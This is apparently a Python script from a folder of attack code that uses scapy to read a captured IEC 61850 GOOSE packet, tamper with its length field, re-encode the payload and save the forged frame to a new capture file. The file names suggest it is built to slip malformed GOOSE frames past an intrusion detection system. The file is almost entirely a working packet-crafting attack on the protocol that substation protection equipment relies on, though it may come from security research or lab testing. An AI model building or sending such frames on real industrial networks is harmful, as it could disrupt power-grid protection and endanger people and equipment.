from gooseFunc import *
from scapy.all import *

GOOSE_TYPE = 0x88b8

# We have to tell script where to find the Goose module in parent directory
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)

packets = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')
g_packets = []  # To store goose packets

for packet in packets:
    if goose_check(packet, GOOSE_TYPE):                                  
        g_packets.append(packet)

mod_packet = g_packets[0]

# Extracting the GOOSE header (8 Bytes: appid, length, reserved1, reserved2)
mod_packet_load_start_goose = mod_packet.load[:8]
# Extracting the allData payload from the end (6 bytes)
mod_packet_load_end_alldata = mod_packet.load[-6:]

# Parse the GOOSE packet for modification
mod_data = GOOSE(mod_packet.load)
mod_pdu = mod_data[GOOSEPDU].original

# Modify the length field (example adding 34 bytes to length)
mod_data.length += 30

# Encode the modified GOOSE PDU (ASN.1/BER encoding)
encoded_data = encoder.encode(gooseAllData_decode(mod_pdu))

# Rebuild the modified packet (GOOSE header + modified payload + remaining data structure)
mod_packet.load = mod_packet_load_start_goose + encoded_data + mod_packet_load_end_alldata

# Print the modified packet details
print("\nModified Frame:")
mod_packet.show()
mod_data.show()

# Save the modified packet to a new pcap file
f_name = 'Attack codes\goose_exploit\s2.pcapng'
wrpcap(f_name, mod_packet, append=True)
